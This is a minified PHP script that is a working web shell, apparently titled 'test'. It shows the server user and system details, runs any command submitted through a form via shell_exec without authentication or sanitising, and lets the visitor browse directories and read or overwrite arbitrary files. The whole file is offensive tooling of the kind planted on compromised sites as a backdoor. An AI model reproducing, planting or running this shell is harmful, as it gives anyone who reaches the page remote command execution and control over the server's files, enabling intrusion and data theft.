define('SCRIPT_NAME','test');$current_directory=getcwd();$current_device=shell_exec('uname -a');$current_user=shell_exec('whoami');$command_output='';$file_content='';if($_SERVER['REQUEST_METHOD']==='POST'){if(!empty($_POST['change_dir'])){$target_dir=$_POST['change_dir'];if(is_dir($target_dir)){chdir($target_dir);$current_directory=getcwd();}else{chdir(dirname($target_dir));$current_directory=getcwd();$file_content=file_get_contents($target_dir);}}if(!empty($_POST['update_file'])&&isset($_POST['file_content'])){file_put_contents($_POST['update_file'],$_POST['file_content']);}if(!empty($_POST['command'])){$command_output=shell_exec("cd \"{$current_directory}\" && {$_POST['command']} 2>&1");}}function getDirectoryContents($dir){$result=[];if(!is_dir($dir)){return $result;}$items=scandir($dir);foreach($items as $item){if($item!=='.'){$path=$dir.DIRECTORY_SEPARATOR.$item;$stat=stat($path);$result[$item]=['type'=>is_dir($path)?'directory':'file','permissions'=>substr(sprintf('%o',fileperms($path)),-4),'size'=>$stat['size'],'modified'=>date("F d Y H:i:s",$stat['mtime']),];}}return $result;}$directory_contents=getDirectoryContents($current_directory);echo '<!DOCTYPE html>';echo '<html lang="en">';echo '<head>';echo '<meta charset="UTF-8">';echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';echo '<title>'.htmlspecialchars(SCRIPT_NAME).'</title>';echo '<style>';echo 'body { font-family: Arial, sans-serif; background-color: #121212; color: #e0e0e0; }';echo '.directory-path form { display: inline; }';echo '.directory-path input[type="submit"] { background: none; border: none; color: #bb86fc; cursor: pointer; text-decoration: underline; }';echo 'table { width: 100%; border-collapse: collapse; }';echo 'th, td { padding: 8px; text-align: left; border: 1px solid #333; }';echo 'th { background-color: #333; }';echo 'tr:nth-child(even) { background-color: #1e1e1e; }';echo 'tr:hover { background-color: #333; }';echo 'textarea { width: 100%; height: 150px; background-color: #333; color: #e0e0e0; border: 1px solid #555; }';echo 'input, button { background-color: #333; color: #e0e0e0; border: 1px solid #555; padding: 5px; }';echo 'button { cursor: pointer; }';echo 'h1, h3 { color: #bb86fc; }';echo '</style>';echo '</head>';echo '<body>';echo '<h1>'.htmlspecialchars(SCRIPT_NAME).'</h1>';echo '<div>';echo '<strong>User:</strong> '.htmlspecialchars($current_user).'<br>';echo '<strong>Current Directory:</strong> <code>'.htmlspecialchars($current_directory).'</code>';echo '</div>';echo '<br>';echo '<form method="post">';echo '<input type="text" name="command" placeholder="Enter command" autofocus autocomplete="off">';echo '<input type="hidden" name="change_dir" value="'.htmlspecialchars($current_directory).'">';echo '<button type="submit">Execute</button>';echo '</form>';echo '<pre>'.htmlspecialchars($command_output).'</pre>';if(!empty($file_content)){echo '<h3>Editing: '.htmlspecialchars($_POST['change_dir']).'</h3>';echo '<form method="post">';echo '<textarea name="file_content">'.htmlspecialchars($file_content).'</textarea><br>';echo '<input type="hidden" name="update_file" value="'.htmlspecialchars($_POST['change_dir']).'">';echo '<button type="submit">Save Changes</button>';echo '</form>';}echo '<h3>Directory Contents</h3>';echo '<table>';echo '<thead>';echo '<tr>';echo '<th>Name</th>';echo '<th>Type</th>';echo '<th>Size</th>';echo '<th>Owner</th>';echo '<th>Permissions</th>';echo '<th>Last Modified</th>';echo '</tr>';echo '</thead>';echo '<tbody>';foreach($directory_contents as $name=>$info){echo '<tr>';echo '<td>';echo '<form method="post" style="display:inline;">';echo '<input type="hidden" name="change_dir" value="'.htmlspecialchars($current_directory.'/'.$name).'">';echo '<input type="submit" value="'.htmlspecialchars($name).'">';echo '</form>';echo '</td>';echo '<td>'.htmlspecialchars($info['type']).'</td>';echo '<td>'.htmlspecialchars($info['size']).'</td>';echo '<td>'.htmlspecialchars($info['permissions']).'</td>';echo '<td>'.htmlspecialchars($info['modified']).'</td>';echo '</tr>';}echo '</tbody>';echo '</table>';echo '</body>';echo '</html>';
